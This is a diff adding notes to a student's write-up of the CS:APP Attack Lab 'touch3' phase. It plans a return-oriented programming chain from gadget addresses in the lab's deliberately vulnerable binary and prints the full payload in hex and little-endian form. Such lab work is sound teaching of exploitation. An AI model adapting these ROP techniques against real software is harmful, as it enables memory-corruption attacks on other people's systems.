@@ -321,3 +321,85 @@ Let's encode it.
 ### Touch3
 
 in progress..
+
+ROP version of hexmatch seems to generate a real random number.
+
+The stack address is random, so we need to calculate it relatively.
+
+WE HAVE ADD FUNCTION!
+
+<add_xy> at `0x401b70`!!!!
+
+Yeah, however we want stack look like:
+
+(low)
+
+- mov %rsp,%rdi
+- popq %rax
+- offset
+- mov %rax,%rsi
+- add_xy
+- mov %rax,%rdi
+- touch3
+- cookie string
+
+(high)
+
+Sadly there are no `mov %rsp,%rdi` and `mov %rax,%rsi`.
+
+Instead, we can transfer using another path:
+
+- %rsp -> %rax -> %rdi
+- %rax -> %rcx -> %rdx -> %rsi
+
+So instructions using gadgets are:
+
+(low)
+
+- mov %rsp,%rax 	(<setval_461+2>, 0x401bb7, 48 89 e0 c3)
+- mov %rax,%rdi		(<setval_489+2>, 0x401b65, 48 89 c7 c3)
+- popq %rax		(<getval_464+1>, 0x401b3d, 58 90 90 c3)
+- offset		72 bytes
+- mov %rax,%rcx		(<getval_191+1>, 0x401c35, 89 c1 90 c3)
+- mov %rcx,%rdx		(<getval_458+1>, 0x401b9d, 89 ca 90 90 c3)
+- mov %rdx,%rsi		(<addval_453+2>, 0x401b84, 89 d6 84 c9 c3)
+- add_xy
+- mov %rax,%rdi		(<setval_489+2>, 0x401b65, 48 89 c7 c3)
+- touch3		(<touch3>, 0x401a98)
+- cookie string
+
+(high)
+
+
+In hex!
+
+00 00 00 00 00 40 1b b7
+00 00 00 00 00 40 1b 65
+00 00 00 00 00 40 1b 3d
+00 00 00 00 00 00 00 48 // offset
+00 00 00 00 00 40 1c 35
+00 00 00 00 00 40 1b 9d
+00 00 00 00 00 40 1b 84
+00 00 00 00 00 40 1b 70 // <add_xy>
+00 00 00 00 00 40 1b 65
+00 00 00 00 00 40 1a 98 // <touch3>
+35 37 38 38 65 39 65 37 // cookie string
+
+Little endian!
+
+b7 1b 40 00 00 00 00 00
+65 1b 40 00 00 00 00 00
+3d 1b 40 00 00 00 00 00
+48 00 00 00 00 00 00 00 // offset
+35 1c 40 00 00 00 00 00
+9d 1b 40 00 00 00 00 00
+84 1b 40 00 00 00 00 00 
+70 1b 40 00 00 00 00 00 // <add_xy>
+65 1b 40 00 00 00 00 00
+98 1a 40 00 00 00 00 00 // <touch3>
+35 37 38 38 65 39 65 37 // cookie string
+
+
+
+
+
